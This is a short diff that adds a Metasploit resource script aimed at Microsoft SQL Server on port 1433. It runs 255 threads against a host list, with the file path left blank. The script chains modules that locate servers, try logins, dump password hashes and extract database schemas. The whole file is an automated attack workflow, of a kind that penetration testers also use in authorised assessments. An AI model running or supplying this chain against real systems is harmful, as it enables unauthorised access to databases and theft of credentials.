@@ -1,0 +1,15 @@
+setg RHOSTS file:
+setg THREADS 255
+setg RPORT 1433
+
+use scanner/mssql/mssql_ping
+run
+
+use scanner/mssql/mssql_login
+run
+
+use scanner/mssql/mssql_hashdump
+run
+
+use scanner/mssql/mssql_schemadump
+run
